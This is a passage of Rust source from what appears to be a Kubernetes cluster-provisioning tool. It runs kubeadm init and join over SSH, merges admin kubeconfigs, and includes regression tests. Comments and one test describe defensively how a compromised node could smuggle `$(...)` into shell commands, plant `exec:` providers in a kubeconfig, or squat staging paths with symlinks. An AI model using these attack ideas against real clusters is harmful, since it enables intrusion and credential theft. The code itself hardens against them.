    s.len() == 64 && s.bytes().all(|b| b.is_ascii_hexdigit())
}

impl JoinInfo {
    /// These three values are scraped from the OUTPUT of `kubeadm` running on a
    /// remote control-plane and later interpolated into a `sudo -n bash -c`
    /// on every OTHER node. `shell_quote` only protects the ssh→bash boundary,
    /// never the content, so a compromised cp1 could smuggle `$(...)` in any of
    /// them (whitespace-splitting does not stop that). They have fixed formats:
    /// anything else is refused here, before it can reach a shell.
    fn check(self) -> Result<Self> {
        let bad = |what: &str| {
            Error::Invalid(format!(
                "kubeadm returned a {what} in an unexpected format — refusing to use it in a remote command"
            ))
        };
        if !valid_kubeadm_token(&self.token) {
            return Err(bad("join token"));
        }
        if !valid_ca_cert_hash(&self.ca_cert_hash) {
            return Err(bad("CA certificate hash"));
        }
        if let Some(k) = &self.certificate_key {
            if !valid_certificate_key(k) {
                return Err(bad("certificate key"));
            }
        }
        Ok(self)
    }
}

fn kubeadm_init(
    cp1: &SshTarget,
    label: &str,
    endpoint: &str,
    spec: &ClusterSpec,
    etcd_endpoints: &[String],
) -> Result<JoinInfo> {
    if remote::ssh_check(cp1, "test -f /etc/kubernetes/admin.conf") {
        return recover_join_info(cp1);
    }
    // Two things need kubeadm's `--config` YAML, because flat flags cannot
    // express either: external etcd (`ClusterConfiguration.etcd.external`)
    // and a kube-proxy that is not the default — `addon/kube-proxy` skipped
    // when the pod network replaces it, or a `KubeProxyConfiguration` for
    // `ipvs`. The `stacked` + `iptables` path below is byte-for-byte
    // unchanged, which is what keeps the default free of regression risk.
    //
    // The kube-proxy mode is taken from the resolved PLAN, never from the raw
    // spec field: the plan is where "the operator did not choose" became a
    // value, and reading the raw field here would be a second place that
    // decides the same thing.
    let nodes = spec
        .control_plane
        .count()
        .saturating_add(spec.workers.count());
    let kube_proxy = network_plan(spec, nodes)
        .map(|p| p.kube_proxy)
        .unwrap_or("iptables");
    // The SAME resolution as the flat-flag path below, for the same reason:
    // `ClusterConfiguration.kubernetesVersion` is validated by kubeadm with
    // the identical semver rule that refused `v1.34` on the command line.
    let kubeadm_version = kubeadm_version_arg(spec.k8s_version.as_deref());
    let init_cfg = kubeadm_config::InitConfig {
        k8s_version: kubeadm_version.as_deref(),
        control_plane_endpoint: endpoint,
        pod_subnet: &spec.pod_subnet,
        service_subnet: &spec.service_subnet,
        cri_socket: DELONIX_CRI_SOCKET,
        etcd_endpoints,
        kube_proxy,
    };
    if kubeadm_config::needed(&init_cfg) {
        let yaml = kubeadm_config::render_init_config(&init_cfg)?;
        // `write_private_temp`, not `fs::write` to a pid-derived name: `/tmp` is
        // world-writable and the name was guessable, so another local user could
        // pre-plant a symlink there and redirect the write, or simply read the
        // cluster's init configuration while it sat at the ambient umask.
        let tmp = delonix_state::write_private_temp("delonix-kubeadm-config.yaml", yaml.as_bytes())
            .map_err(|e| {
                Error::Invalid(format!(
                    "{}: {e}",
                    super::po::t("writing local kubeadm-config.yaml")
                ))
            })?;
        // Same reasoning as the local `write_private_temp` right above, applied
        // to the REMOTE side: `stage_and_install` picks a path of this
        // operation's own instead of the guessable `/tmp/delonix-kubeadm-config.yaml`.
        let outcome = stage_and_install(cp1, &tmp, "delonix-kubeadm-config.yaml", |staged| {
            format!(
                "mkdir -p /etc/kubernetes && \
                 mv {staged} /etc/kubernetes/kubeadm-config.yaml && \
                 kubeadm init --config=/etc/kubernetes/kubeadm-config.yaml --upload-certs"
            )
        });
        let _ = std::fs::remove_file(&tmp);
        let out = outcome.map_err(|e| Error::Invalid(format!("[{label}] kubeadm init: {e}")))?;
        return parse_join_info(&out);
    }
    let k8s_ver_flag = kubeadm_version_arg(spec.k8s_version.as_deref())
        .map(|v| format!(" --kubernetes-version={v}"))
        .unwrap_or_default();
    let cmd = format!(
        "kubeadm init --control-plane-endpoint={endpoint} --upload-certs \
         --cri-socket={DELONIX_CRI_SOCKET} \
         --pod-network-cidr={} --service-cidr={}{k8s_ver_flag}",
        spec.pod_subnet, spec.service_subnet
    );
    let out = remote::ssh_run(cp1, &cmd)
        .map_err(|e| Error::Invalid(format!("[{label}] kubeadm init: {e}")))?;
    parse_join_info(&out)
}

fn recover_join_info(cp1: &SshTarget) -> Result<JoinInfo> {
    let join_cmd = remote::ssh_run(cp1, "kubeadm token create --print-join-command")?;
    let token = extract_after(&join_cmd, "--token ")
        .ok_or_else(|| Error::Invalid(super::po::t("no --token in the join-command").into()))?;
    let ca_cert_hash =
        extract_after(&join_cmd, "--discovery-token-ca-cert-hash ").ok_or_else(|| {
            Error::Invalid(
                super::po::t("no --discovery-token-ca-cert-hash in the join-command").into(),
            )
        })?;
    let cert_key_out = remote::ssh_run(cp1, "kubeadm init phase upload-certs --upload-certs")?;
    let certificate_key = extract_after(&cert_key_out, "Using certificate key:\n").or_else(|| {
        // alternative format (single line "certificate key: <hex>") depending on the version.
        extract_after(&cert_key_out, "certificate key:")
    });
    JoinInfo {
        token,
        ca_cert_hash,
        certificate_key,
    }
    .check()
}

/// Extracts from the kubeadm init/join output: `token`/`discovery-token-ca-cert-hash`
/// come from `--flag value`; `certificate-key` likewise. Pure function, tested with
/// a real output sample.
fn parse_join_info(output: &str) -> Result<JoinInfo> {
    let token = extract_after(output, "--token ").ok_or_else(|| {
        Error::Invalid(
            super::po::t("could not extract --token from the kubeadm init output").into(),
        )
    })?;
    let ca_cert_hash =
        extract_after(output, "--discovery-token-ca-cert-hash ").ok_or_else(|| {
            Error::Invalid(
                super::po::t(
                    "could not extract --discovery-token-ca-cert-hash from the kubeadm init output",
                )
                .into(),
            )
        })?;
    let certificate_key = extract_after(output, "--certificate-key ");
    JoinInfo {
        token,
        ca_cert_hash,
        certificate_key,
    }
    .check()
}

fn extract_after(text: &str, marker: &str) -> Option<String> {
    let idx = text.find(marker)?;
    let rest = &text[idx + marker.len()..];
    let value = rest.split_whitespace().next()?;
    Some(value.trim_end_matches('\\').to_string())
}

/// `endpoint` as `kubeadm join` expects it: `host:port`. `valid_endpoint`
/// explicitly accepts `host[:port]` (and `kubeadm_init` interpolates it
/// as-is into `--control-plane-endpoint=`, which takes host or host:port),
/// but this used to unconditionally append `:6443` — a `controlPlaneEndpoint`
/// WITH an explicit non-default port (a real HA setup: an LB/VIP not on
/// 6443) produced `kubeadm join host:8443:6443`, a malformed address, and
/// every control-plane/worker join failed. Only append the default port
/// when the endpoint doesn't already carry one — `valid_endpoint`'s
/// charset has no `[`/`]`, so IPv6 literals can't appear here and a bare
/// `:` unambiguously means "port already present".
fn endpoint_with_default_port(endpoint: &str, default_port: u16) -> String {
    if endpoint.contains(':') {
        endpoint.to_string()
    } else {
        format!("{endpoint}:{default_port}")
    }
}

fn kubeadm_join(
    target: &SshTarget,
    label: &str,
    endpoint: &str,
    info: &JoinInfo,
    as_control_plane: bool,
) -> Result<()> {
    if remote::ssh_check(target, "test -f /etc/kubernetes/kubelet.conf") {
        return Ok(());
    }
    // Last hop before the shell: re-check even though the constructors did.
    if !valid_kubeadm_token(&info.token) || !valid_ca_cert_hash(&info.ca_cert_hash) {
        return Err(Error::Invalid(format!(
            "[{label}] refusing to run kubeadm join with a malformed token/hash"
        )));
    }
    let endpoint = endpoint_with_default_port(endpoint, 6443);
    let mut cmd = format!(
        "kubeadm join {endpoint} --token {} --discovery-token-ca-cert-hash {} \
         --cri-socket={DELONIX_CRI_SOCKET}",
        info.token, info.ca_cert_hash
    );
    if as_control_plane {
        let key = info.certificate_key.as_ref().ok_or_else(|| {
            Error::Invalid(format!(
                "[{label}] {}",
                super::po::t("no certificate-key available for a control-plane join")
            ))
        })?;
        if !valid_certificate_key(key) {
            return Err(Error::Invalid(format!(
                "[{label}] refusing to run kubeadm join with a malformed certificate key"
            )));
        }
        cmd.push_str(&format!(" --control-plane --certificate-key {key}"));
    }
    remote::ssh_run(target, &cmd)
        .map_err(|e| Error::Invalid(format!("[{label}] kubeadm join: {e}")))?;
    Ok(())
}

fn fetch_kubeconfig(
    cp1: &SshTarget,
    cluster_name: &str,
    takeover: ContextTakeover,
) -> Result<PathBuf> {
    let dir = state_root().join("clusters");
    std::fs::create_dir_all(&dir)?;
    let dest = dir.join(format!("{cluster_name}-kubeconfig.yaml"));

    // SECURITY: `/etc/kubernetes/admin.conf` holds cluster-admin credentials
    // (client-certificate-data + client-key-data). The old approach copied it to a
    // FIXED, PREDICTABLE path (`/tmp/delonix-admin.conf`) and made it world-readable
    // (chmod 644) for the window between the sudo `cp` and the unprivileged `scp` —
    // any local user on the control-plane host could read it, or pre-plant the file
    // so the `cp` (non-interactive, no `-i`) wrote into a file THEY already owned.
    // Reading it via `sudo cat` straight into the SSH session's stdout never touches
    // disk on the remote host at all — no temp file, no window, nothing to clean up.
    let kubeconfig = remote::ssh_run(cp1, "cat /etc/kubernetes/admin.conf")?;
    // Defense in depth locally too: cluster-admin credentials shouldn't be readable
    // by other local users just because of the ambient umask. BUG FOUND (adversarial
    // re-audit): `fs::write` + a later `set_permissions` leaves a TOCTOU window — the
    // file is created at umask-default mode (664 under a common umask) for the
    // interval between `create()` and the `chmod` running, and a local
    // watcher/attacker can win that race.
    //
    // The first fix used `OpenOptions::mode(0o600)` with `create(true)`, which
    // closes that window but has a second, quieter hole: `mode()` applies only
    // when the file is CREATED. Re-running `cluster apply` over a kubeconfig
    // left by an older build — one written at 0644 — reopens it and rewrites the
    // credentials while the permissive mode stays exactly as it was. Writing a
    // fresh 0600 file and renaming it into place, which is what
    // `write_atomic_mode` does, gives the right mode every time regardless of
    // what was there before, replaces any symlink sitting at `dest` instead of
    // following it, and makes the update atomic so a crash cannot leave half a
    // kubeconfig behind.
    delonix_state::write_atomic_mode(&dest, kubeconfig.as_bytes(), Some(0o600))?;

    if let Some(home) = std::env::var_os("HOME") {
        let kube_dir = PathBuf::from(home).join(".kube");
        let kube_config = kube_dir.join("config");
        std::fs::create_dir_all(&kube_dir)?;
        merge_into_local_kubeconfig(&dest, cluster_name, &kube_config, takeover)?;
    }
    Ok(dest)
}

/// Merges a single-cluster `admin.conf` (from kubeadm — always names its
/// cluster/user/context `kubernetes`/`kubernetes-admin`/`kubernetes-admin@kubernetes`)
/// into `~/.kube/config`, so `kubectl` ends up with a context PER delonix
/// cluster instead of colliding on those fixed names.
///
/// BUG FIXED HERE: the old code only ever did a flat `fs::copy` the FIRST
/// time `~/.kube/config` didn't exist — a 2nd cluster silently got no entry
/// at all (the file already existed), and `kubectl` never had "all the
/// contexts of the created clusters", only ever the very first one.
///
/// Renames the 3 entries to `<cluster_name>` (cluster+context) /
/// `<cluster_name>-admin` (user) before merging, so distinct delonix
/// clusters never collide on kubeadm's fixed names. Re-running for the SAME
/// cluster name replaces its own 3 entries (idempotent), never duplicates.
/// `current-context` is only set to the new cluster on the FIRST ever write
/// (a fresh `~/.kube/config`) — an existing file's active context is left
/// alone, since silently redirecting `kubectl` for someone with other
/// clusters already configured would be surprising.
/// Builds a MINIMAL `clusters[]` entry, copying only the two fields kubeadm's
/// generated `admin.conf` is known to populate (the API server URL and the
/// inline CA cert) — never the raw fetched block. See the caller for why:
/// this is what stops a compromised control-plane host's admin.conf from
/// smuggling e.g. `insecure-skip-tls-verify: true` into the operator's
/// kubeconfig.
fn safe_cluster_entry(name: &str, raw: &serde_yaml::Value) -> serde_yaml::Value {
    use serde_yaml::Value;
    let mut cluster = serde_yaml::Mapping::new();
    if let Some(v) = raw.get("cluster").and_then(|c| c.get("server")) {
        cluster.insert(Value::from("server"), v.clone());
    }
    if let Some(v) = raw
        .get("cluster")
        .and_then(|c| c.get("certificate-authority-data"))
    {
        cluster.insert(Value::from("certificate-authority-data"), v.clone());
    }
    let mut m = serde_yaml::Mapping::new();
    m.insert(Value::from("name"), Value::from(name));
    m.insert(Value::from("cluster"), Value::Mapping(cluster));
    Value::Mapping(m)
}

/// Builds a MINIMAL `users[]` entry, copying only the inline client
/// certificate/key kubeadm's `admin.conf` is known to carry — never an
/// `exec:` auth-provider or any other field the raw fetched block might
/// contain. See `safe_cluster_entry`'s doc for the threat this closes.
fn safe_user_entry(name: &str, raw: &serde_yaml::Value) -> serde_yaml::Value {
    use serde_yaml::Value;
    let mut user = serde_yaml::Mapping::new();
    for key in ["client-certificate-data", "client-key-data"] {
        if let Some(v) = raw.get("user").and_then(|u| u.get(key)) {
            user.insert(Value::from(key), v.clone());
        }
    }
    let mut m = serde_yaml::Mapping::new();
    m.insert(Value::from("name"), Value::from(name));
    m.insert(Value::from("user"), Value::Mapping(user));
    Value::Mapping(m)
}

/// Whether the cluster being created takes over `current-context` in the
/// operator's kubeconfig.
///
/// A named type and not a fourth `bool` parameter: the functions that carry it
/// down (`apply_one`, `apply_ssh`) already take `wait_ready: bool`, and two
/// adjacent bools at a call site is precisely how the wrong one gets passed.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum ContextTakeover {
    /// Leave an already usable `current-context` pointing where it points —
    /// the default, and the invariant the multi-cluster test pins.
    Keep,
    /// Point `kubectl` at the cluster just created, even over a usable
    /// selection (`--use-context`).
    Switch,
}

fn merge_into_local_kubeconfig(
    source: &Path,
    cluster_name: &str,
    dest: &Path,
    takeover: ContextTakeover,
) -> Result<()> {
    use serde_yaml::Value;

    let read_yaml = |p: &Path| -> Result<Value> {
        let s = std::fs::read_to_string(p)?;
        serde_yaml::from_str(&s).map_err(|e| {
            Error::Invalid(format!(
                "{}: {e}",
                super::po::tf(
                    "malformed kubeconfig ({path})",
                    &[("path", &p.display().to_string())],
                )
            ))
        })
    };
    let as_seq = |v: &Value, key: &str| -> Vec<Value> {
        v.get(key)
            .and_then(|x| x.as_sequence())
            .cloned()
            .unwrap_or_default()
    };
    let entry_name = |v: &Value| -> Option<String> {
        v.get("name").and_then(|n| n.as_str()).map(str::to_string)
    };

    let src = read_yaml(source)?;
    let user_name = format!("{cluster_name}-admin");

    // BUG FIXED HERE (HIGH, found live by adversarial review): this used to
    // clone the fetched `clusters[0]`/`users[0]` entries VERBATIM (only their
    // `name` field got rewritten) into the operator's real ~/.kube/config.
    // `source` is `/etc/kubernetes/admin.conf` read straight off the remote
    // control-plane host over SSH — a kubeconfig `users[].user` block can
    // legally carry an `exec:` auth-provider (arbitrary LOCAL command
    // execution the next time `kubectl` uses this context) or a
    // `clusters[].cluster.insecure-skip-tls-verify: true`. If that host is
    // ever compromised post-provisioning, a planted admin.conf turns into
    // code execution on the OPERATOR's own machine the moment they next use
    // the merged context. Build fresh entries containing ONLY the fields
    // kubeadm's own generated admin.conf is known to carry — never clone the
    // raw fetched cluster/user blocks.
    let raw_clusters = as_seq(&src, "clusters");
    let raw_users = as_seq(&src, "users");
    let clusters = vec![safe_cluster_entry(
        cluster_name,
        raw_clusters.first().unwrap_or(&Value::Null),
    )];
    let users = vec![safe_user_entry(
        &user_name,
        raw_users.first().unwrap_or(&Value::Null),
    )];
    let mut contexts = as_seq(&src, "contexts");
    if let Some(ctx) = contexts.first_mut() {
        ctx["name"] = Value::String(cluster_name.to_string());
        ctx["context"]["cluster"] = Value::String(cluster_name.to_string());
        ctx["context"]["user"] = Value::String(user_name.clone());
    }

    let first_write = !dest.exists();
    let mut merged = if first_write {
        serde_yaml::from_str::<Value>(
            "apiVersion: v1\nkind: Config\npreferences: {}\nclusters: []\ncontexts: []\nusers: []\n",
        )
        .expect("static skeleton is valid")
    } else {
        read_yaml(dest)?
    };

    for (key, fresh) in [
        ("clusters", &clusters),
        ("contexts", &contexts),
        ("users", &users),
    ] {
        let mut existing = as_seq(&merged, key);
        let fresh_names: Vec<Option<String>> = fresh.iter().map(entry_name).collect();
        existing.retain(|e| !fresh_names.contains(&entry_name(e)));
        existing.extend(fresh.iter().cloned());
        merged[key] = Value::Sequence(existing);
    }
    // Point `kubectl` at this cluster when — and ONLY when — it is not already
    // pointed somewhere usable. Creating a second cluster must not yank the
    // context out from under someone working in the first (the invariant the
    // multi-cluster test pins); but leaving `current-context` unset, or aimed at
    // a context that is no longer in the file, is not a preference to protect —
    // it is a `kubectl` that answers `localhost:8080: connection refused`.
    //
    // Reported live: three contexts merged fine and `kubectl config
    // current-context` still said `current-context is not set`, so a bare
    // `kubectl get nodes` went to the default endpoint and failed with an error
    // that reads like a broken cluster and is a missing selection.
    let current_is_usable = merged
        .get("current-context")
        .and_then(Value::as_str)
        .filter(|c| !c.is_empty())
        .is_some_and(|current| {
            as_seq(&merged, "contexts")
                .iter()
                .any(|e| entry_name(e).as_deref() == Some(current))
        });
    // `--use-context` is the operator saying "and point kubectl here" — the one
    // case that may override a perfectly usable selection. Without it the
    // decision is exactly what it was.
    if first_write || !current_is_usable || takeover == ContextTakeover::Switch {
        merged["current-context"] = Value::String(cluster_name.to_string());
    }

    let out = serde_yaml::to_string(&merged).map_err(|e| {
        Error::Invalid(format!(
            "{}: {e}",
            super::po::t("failed to serialize the kubeconfig")
        ))
    })?;
    // Mode at creation, never write-then-chmod: this file holds cluster-admin
    // credentials, and `fs::write` would create it at the umask (0644 on a
    // default install) for the window before the `chmod` lands. Same fix
    // `fetch_kubeconfig` already carries a few functions up; this path had been
    // left on the old shape.
    delonix_state::write_atomic_mode(dest, out.as_bytes(), Some(0o600))?;
    for line in merge_report(
        &dest.display().to_string(),
        cluster_name,
        merged
            .get("current-context")
            .and_then(Value::as_str)
            .unwrap_or_default(),
    ) {
        println!("{line}");
    }
    Ok(())
}

/// What [`merge_into_local_kubeconfig`] reports once the file is written:
/// where the context landed, and — when `kubectl` did NOT move — the command
/// that moves it.
///
/// Pure and separate from the writing so the switch instruction is pinned by a
/// test rather than only seen by eye. That instruction is half of how a newly
/// created cluster becomes reachable by a bare `kubectl` (`--use-context` is
/// the other half), and it used to be buried mid-sentence inside the "stays
/// on" line, where a command is a command nobody copies.
fn merge_report(path: &str, cluster_name: &str, current: &str) -> Vec<String> {
    if current == cluster_name {
        return vec![super::po::tf(
            "merged into {path} as context '{ctx}' — kubectl now points here",
            &[("path", path), ("ctx", cluster_name)],
        )];
    }
    vec![
        // Say where kubectl still points, not just how to move it: the useful
        // fact is that this cluster is NOT the current one.
        super::po::tf(
            "merged into {path} as context '{ctx}' (kubectl stays on '{cur}')",
            &[("path", path), ("ctx", cluster_name), ("cur", current)],
        ),
        super::po::t("to point kubectl at this cluster, run:").to_string(),
        // Not through the catalog: this is a command to be typed, not prose.
        // A msgid here invites a translation that would stop being the command.
        format!("    kubectl config use-context {cluster_name}"),
    ]
}

/// Handles this group's `init` (see `cmd::scaffold`).
fn cmd_init(
    target: super::scaffold::Target,
    dir: PathBuf,
    name: Option<String>,
    image: Option<String>,
    force: bool,
) -> Result<()> {
    let name = name.unwrap_or_else(|| {
        // Without `--name`, uses the DIRECTORY name. Cannot use `canonicalize`:
        // the directory does not exist yet (it is `init` that creates it) and it would always fail,
        // falling into the fallback — every project would be named "app".
        // `.`/empty resolve to the cwd; a new path uses its basename.
        let p = if dir.as_os_str().is_empty() || dir == std::path::Path::new(".") {
            std::env::current_dir().ok()
        } else {
            Some(dir.clone())
        };
        p.as_deref()
            .and_then(|p| p.file_name())
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| "app".to_string())
    });
    super::scaffold::init(
        target,
        &super::scaffold::InitOpts {
            dir,
            name,
            image,
            force,
            template: None,
            template_version: None,
            up: false,
            edge: Default::default(),
        },
    )
}

#[cfg(test)]
mod tests {
    #[test]
    fn the_binary_decides_before_the_service() {
        assert_eq!(cri_action(true, true), CriAction::Nothing);
        assert_eq!(cri_action(true, false), CriAction::Start);
        // The case of #242: the golden's CRI is active, yet it is not ours.
        assert_eq!(cri_action(false, true), CriAction::Replace);
        assert_eq!(cri_action(false, false), CriAction::Replace);
    }

    use super::*;

    /// DETERMINISM is the contract. `destroy` recomputes this name to decide
    /// whether a network is the engine's own, so the same cluster name must
    /// always give the same network name — otherwise `destroy` stops
    /// recognizing what `kubeadm` created and leaks one network per cycle.
    #[test]
    fn the_cluster_network_name_is_deterministic() {
        assert_eq!(cluster_vm_net("lab"), cluster_vm_net("lab"));
        assert_ne!(cluster_vm_net("lab"), cluster_vm_net("lab2"));
    }

    /// Shape: the cluster name, then a hash suffix. The prefix is what makes it
    /// readable in `network ls`; the suffix is what keeps it from colliding
    /// with a network the operator already has called exactly `lab`.
    #[test]
    fn the_cluster_network_name_is_the_cluster_plus_a_suffix() {
        let net = cluster_vm_net("lab");
        assert!(net.starts_with("lab-"), "{net}");
        assert_ne!(net, "lab", "must not shadow an operator's own 'lab'");
        // 8 hex chars of sha256 — enough to not collide, short enough to type.
        let suffix = net.strip_prefix("lab-").expect("prefixed");
        assert_eq!(suffix.len(), 8, "{net}");
        assert!(suffix.chars().all(|c| c.is_ascii_hexdigit()), "{net}");
    }

    /// The node's CRI must be able to run the cluster's own privileged system
    /// pods, so the bootstrap writes an explicit ceiling drop-in next to the
    /// unit, before the daemon is reloaded — and never overwrites an existing one.
    #[test]
    fn the_cluster_unit_install_lifts_the_default_ceiling_explicitly() {
        let cmd = install_cri_unit_command("/tmp/delonix-cri.service.1.0");
        assert!(cmd.contains("DELONIX_CRI_CAP_CEILING=all"), "{cmd}");
        assert!(cmd.contains(REMOTE_CRI_CEILING_DROPIN), "{cmd}");
        assert!(
            cmd.contains(&format!("[ -e {REMOTE_CRI_CEILING_DROPIN} ] ||")),
            "an existing drop-in must be kept: {cmd}"
        );
        assert!(cmd.contains("mkdir -p /etc/systemd/system/delonix-cri.service.d"));
        let (write, reload) = (
            cmd.find("DELONIX_CRI_CAP_CEILING").unwrap(),
            cmd.find("daemon-reload").unwrap(),
        );
        assert!(
            write < reload,
            "the drop-in must exist before daemon-reload"
        );
    }

    /// REGRESSION, diagnosed live on 2026-10-15: `install_cli`/`install_cri`
    /// staged their uploads at FIXED paths while `apply_ssh` prepares hosts
    /// concurrently, so two preps landing on the same host (two node records
    /// resolving to one address) raced on one filename and the loser died with
    /// `mv: cannot stat '/tmp/delonix-cri'`. Every staged path must now be
    /// distinct, INCLUDING between two calls from the same process — the racing
    /// preps are threads, so a pid-only suffix would still collide.
    #[test]
    fn every_staged_upload_gets_a_path_of_its_own() {
        let n = 64;
        let dirs: std::collections::HashSet<String> = (0..n)
            .map(|_| remote_staging_path("delonix-cri").1)
            .collect();
        assert_eq!(dirs.len(), n, "staging directories collided: {dirs:?}");

        let (staged, dir) = remote_staging_path("delonix-cri");
        // The uniqueness lives in the DIRECTORY; the file keeps its plain name,
        // so an operator looking at a node mid-prep sees what is being installed.
        assert!(dir.starts_with("/tmp/delonix-stage."), "{dir}");
        assert_eq!(staged, format!("{dir}/delonix-cri"));
        // The pid is in there: it is what separates two concurrent `delonix` runs.
        assert!(dir.contains(&format!(".{}.", std::process::id())), "{dir}");
        // No shell metacharacter: both go straight into `ssh_run` command strings,
        // and `dir` in particular into an `rm -rf`.
        for p in [&staged, &dir] {
            assert!(
                p.chars()
                    .all(|c| c.is_ascii_alphanumeric() || "/._-".contains(c)),
                "{p}"
            );
        }
        // Every other upload in this file goes through the same helper, so each
        // lands in a directory of its own — nothing here shares a remote path.
        for stem in [
            "delonix-cli",
            "delonix-cri.service",
            "delonix-10-bridge.conflist",
            "delonix-kubeadm-config.yaml",
        ] {
            let (f, d) = remote_staging_path(stem);
            assert_eq!(f, format!("{d}/{stem}"));
        }
    }

    /// The wrapper around every staged install is hand-written shell, so it is
    /// checked as shell: really parsed, really run. Each case runs against a
    /// REAL directory and asserts the three things the wrapper owes its caller —
    /// the install's exit status (not the cleanup's), the install's stdout
    /// (`kubeadm init`'s output is parsed), and the directory gone either way.
    #[test]
    fn the_staged_install_script_keeps_the_status_the_output_and_cleans_up() {
        // Every install command this file actually builds, including the one
        // that ends in `; true` and the one that is a multi-line `&&` chain.
        let dummy = "/tmp/delonix-stage.0.0.0/x";
        for cmd in [
            format!("mv {dummy} /usr/local/bin/delonix && chmod +x /usr/local/bin/delonix"),
            install_cri_unit_command(dummy),
            format!(
                "mkdir -p /etc/cni/net.d && mv {dummy} /etc/cni/net.d/10-bridge.conflist && \
                 KUBECONFIG=/etc/kubernetes/admin.conf kubectl taint nodes --all \
                 node-role.kubernetes.io/control-plane- >/dev/null 2>&1; true"
            ),
        ] {
            let script = staged_install_script(&cmd, "/tmp/delonix-stage.0.0.0");
            let out = std::process::Command::new("bash")
                .arg("-n")
                .arg("-c")
                .arg(&script)
                .output()
                .expect("spawn bash -n");
            assert!(
                out.status.success(),
                "not valid shell: {script}\n{}",
                String::from_utf8_lossy(&out.stderr)
            );
        }

        // Behaviour, for real. `bash -n` would accept a script that captured
        // `$?` after the `rm` just as happily.
        let run = |install: &str| {
            let tmp = tempfile::tempdir().unwrap();
            let dir = tmp.path().join("stage");
            std::fs::create_dir(&dir).unwrap();
            std::fs::write(dir.join("payload"), b"x").unwrap();
            let out = std::process::Command::new("bash")
                .arg("-c")
                .arg(staged_install_script(install, &dir.to_string_lossy()))
                .output()
                .expect("spawn bash");
            (
                out.status.success(),
                String::from_utf8_lossy(&out.stdout).into_owned(),
                dir.exists(),
            )
        };

        let (ok, stdout, leftover) = run("echo 'kubeadm join --token abc'");
        assert!(ok, "a successful install must report success");
        assert!(
            stdout.contains("kubeadm join --token abc"),
            "the install's stdout has to reach the caller: {stdout:?}"
        );
        assert!(!leftover, "the staging directory must be gone");

        // The regression that matters most: a FAILED install must still fail,
        // even though the `rm` right after it succeeds.
        let (ok, _, leftover) = run("false");
        assert!(
            !ok,
            "a failed install reported success — $? captured too late"
        );
        assert!(
            !leftover,
            "the staging directory must be gone on failure too"
        );

        // The deliberately-tolerant one stays tolerant.
        let (ok, _, _) = run("false >/dev/null 2>&1; true");
        assert!(
            ok,
            "`; true` must still swallow the failure it is there to swallow"
        );
    }

    /// The staging directory is the remote `O_EXCL`: `mkdir` without `-p` fails
    /// on an existing path (a squatted symlink included) instead of letting
    /// `scp` write through it, and `-m 700` stops anything being planted inside
    /// afterwards. Both flags are load-bearing — see `stage_and_install`.
    #[test]
    fn the_staging_directory_refuses_a_squatted_path() {
        // The squat that matters: a symlink where our directory is about to go,
        // pointing at a directory the attacker can write. `mkdir -p` resolves it
        // and reports success, which would leave the upload sitting in THEIR
        // directory — replaceable between the `scp` and the `mv`. A symlink to a
        // plain file would be refused even by `-p`, so it proves nothing.
        let tmp = tempfile::tempdir().unwrap();
        let attacker = tmp.path().join("attacker-owned");
        std::fs::create_dir(&attacker).unwrap();
        let squatted = tmp.path().join("delonix-stage.1.0.0");
        std::os::unix::fs::symlink(&attacker, &squatted).unwrap();

        let plain = std::process::Command::new("mkdir")
            .args(["-m", "700"])
            .arg(&squatted)
            .output()
            .expect("spawn mkdir");
        assert!(
            !plain.status.success(),
            "mkdir must refuse a path that already exists as a symlink"
        );

        // `-p` is exactly what would have swallowed it — the flag
        // `stage_and_install` must never grow.
        let with_p = std::process::Command::new("mkdir")
            .args(["-p", "-m", "700"])
            .arg(&squatted)
            .output()
            .expect("spawn mkdir -p");
        assert!(
            with_p.status.success(),
            "mkdir -p accepts the squat: that is why stage_and_install omits it"
        );
        // ...and this is the harm it would have let through: the path we would
        // have uploaded to resolves inside the attacker's directory.
        std::fs::write(squatted.join("delonix-cri"), b"staged").unwrap();
        assert!(
            attacker.join("delonix-cri").exists(),
            "a write through the squatted path lands in the attacker's directory"
        );
    }

    /// The companion to the test above: no upload may go back to a path that
    /// does not come from [`remote_staging_path`]. A new `scp_to` with a
    /// hand-written `/tmp/...` destination is the regression this catches, and
    /// it would reintroduce both the race and the guessable name.
    ///
    /// Reads this file's CODE only — the test module is cut away. The needle is
    /// a literal, so this very assertion contains it; scanning the whole file
    /// would make the test match itself and fail forever, which is the trap the
    /// libvirt provider's own source-scanning test documents.
    #[test]
    fn no_upload_targets_a_fixed_remote_tmp_path() {
        let src = include_str!("cluster.rs");
        let code = src
            .split_once("\n#[cfg(test)]\nmod tests {")
            .map(|(code, _)| code)
            .expect("this file's test module marks where the code ends");
        let offenders: Vec<&str> = code
            .lines()
            .map(str::trim)
            // Only the uploads: the `mv` commands take the staged path as an
            // argument, and the doc-comments quote the old paths on purpose.
            .filter(|l| l.contains("scp_to(") && l.contains("\"/tmp/"))
            .collect();
        assert!(
            offenders.is_empty(),
            "upload to a fixed remote path — use stage_and_install: {offenders:?}"
        );
    }

    /// A node that already runs the right CRI (golden image) is brought to the same
    /// ceiling without a restart when the drop-in is already there.
    #[test]
    fn a_node_already_running_the_cri_gets_the_ceiling_only_if_missing() {
        let cmd = ensure_cri_ceiling_command();
        assert!(
            cmd.starts_with(&format!("[ -e {REMOTE_CRI_CEILING_DROPIN} ] ||")),
            "nothing to do when the drop-in exists: {cmd}"
        );
        assert!(cmd.contains("DELONIX_CRI_CAP_CEILING=all"), "{cmd}");
        assert!(cmd.contains("systemctl restart delonix-cri"), "{cmd}");
    }

    /// Regression (KaaS capability audit, gap #1): the conflist this engine
    /// writes for a single-node `cni: default` cluster has to parse with the
    /// SAME parser `delonix-cri`'s own root-mode pod-sandbox path reads it
    /// with (`delonix_sdn::cni::parse_config`/`readiness`) — a conflist that
    /// is merely "valid JSON" but shaped wrong would compile this fix,
    /// commit it, and still leave the node `NotReady`, undetectably.
    #[test]
    fn single_node_bridge_conflist_parses_with_the_engines_own_cni_reader() {
        let json = single_node_bridge_conflist("10.244.0.0/24");
        let parsed = delonix_sdn::cni::parse_config(&json)
            .expect("the engine's own CNI parser must accept this conflist");
        assert_eq!(parsed.name, "bridge");
        let types: Vec<&str> = parsed
            .plugins
            .iter()
            .map(|p| p["type"].as_str().unwrap())
            .collect();
        assert_eq!(types, ["bridge", "portmap"]);
        assert_eq!(parsed.plugins[0]["ipam"]["type"], "host-local");
        assert_eq!(
            parsed.plugins[0]["ipam"]["ranges"][0][0]["subnet"],
            "10.244.0.0/24"
        );
        // `readiness()` is what actually gates a kubelet's `NetworkReady` —
